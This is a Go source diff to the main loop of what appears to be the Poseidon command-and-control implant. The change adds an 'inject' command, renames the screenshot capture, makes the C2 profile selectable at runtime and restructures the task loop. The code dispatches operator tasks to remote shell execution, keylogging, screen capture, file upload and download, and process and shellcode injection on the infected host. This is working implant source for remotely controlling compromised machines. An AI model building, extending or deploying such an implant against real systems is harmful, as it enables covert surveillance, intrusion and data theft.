@@ -12,11 +12,12 @@ import (
 
 	"github.com/xorrior/poseidon/pkg/commands/cat"
 	"github.com/xorrior/poseidon/pkg/commands/getprivs"
+	"github.com/xorrior/poseidon/pkg/commands/inject"
 	"github.com/xorrior/poseidon/pkg/commands/keys"
 	"github.com/xorrior/poseidon/pkg/commands/ls"
 	"github.com/xorrior/poseidon/pkg/commands/portscan"
 	"github.com/xorrior/poseidon/pkg/commands/ps"
-	"github.com/xorrior/poseidon/pkg/commands/screenshot"
+	"github.com/xorrior/poseidon/pkg/commands/screencapture"
 	"github.com/xorrior/poseidon/pkg/commands/shell"
 	"github.com/xorrior/poseidon/pkg/commands/sshauth"
 	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
@@ -46,11 +47,8 @@ func main() {
 	hostname, _ := os.Hostname()
 	currIP := functions.GetCurrentIPAddress()
 	currPid := os.Getpid()
-	// Modify the profile used by changing this line
-	profile := profiles.C2Patchthrough{}
-	// profile := profiles.C2Default{}
-	// profile := profiles.C2Slack{}
-	// profile := profiles.C2Websocket{}
+	p := profiles.NewInstance()
+	profile := p.(profiles.Profile)
 	profile.SetUniqueID(profiles.UUID)
 	profile.SetURL(profiles.BaseURL)
 	profile.SetURLs(profiles.BaseURLs)
@@ -87,7 +85,8 @@ func main() {
 		"keylog":           3,
 		"download":         4,
 		"upload":           5,
-		"shinject":         6,
+		"inject":           6,
+		"shinject":         21,
 		"ps":               7,
 		"sleep":            8,
 		"cat":              9,
@@ -108,6 +107,7 @@ func main() {
 	res := make(chan structs.ThreadMsg)
 	//if we have an Active apfell session, enter the tasking loop
 	if strings.Contains(checkIn.Status, "success") {
+	LOOP:
 		for {
 			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)
 
@@ -119,15 +119,18 @@ func main() {
 			case 0:
 				// Throw away the response, we don't really need it for anything
 				profile.PostResponse(task, "Exiting")
-				os.Exit(0)
-				break
+				break LOOP
 			case 1:
 				// Run shell command
 				go shell.Run(task, res)
 				break
 			case 2:
 				// Capture screenshot
-				go screenshot.Run(task, res)
+				go screencapture.Run(task, res)
+				break
+			case 4:
+				//File download
+				profile.Download(task, task.Params)
 				break
 			case 5:
 				// File upload
@@ -156,12 +159,11 @@ func main() {
 
 				break
 
-			case 4:
-				//File download
-				profile.Download(task, task.Params)
+			case 6:
+				go inject.Run(task, res)
 				break
 
-			case 6:
+			case 21:
 				tMsg := &structs.ThreadMsg{}
 				tMsg.TaskItem = task
 				args := &shinject.Arguments{}
